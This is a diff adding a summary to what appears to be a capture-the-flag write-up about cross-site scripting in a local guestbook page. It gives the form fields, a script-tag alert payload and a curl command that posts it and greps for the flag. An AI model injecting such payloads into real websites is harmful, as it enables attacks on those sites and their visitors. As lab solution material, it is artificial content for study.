@@ -1,5 +1,24 @@
 # Crossite scripting
 
+## Summary
+
+page: `http://localhost:8080/index.php?page=feedback`
+commands: In the guestbook form, enter in the **Name** field:
+```
+test
+```
+and in the **Message** field:
+```html
+<script>alert('XSS')</script>
+```
+Or via curl:
+```bash
+curl -X POST "http://localhost:8080/index.php?page=feedback" \
+     -d "txtName=test&mtxtMessage=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&btnSign=Sign+Guestbook" | grep flag
+```
+
+## Details
+
 The guestbook page is vulnerable to XSS.
 
 I entered a <script>alert('XSS')</script in the comment box and got the flag
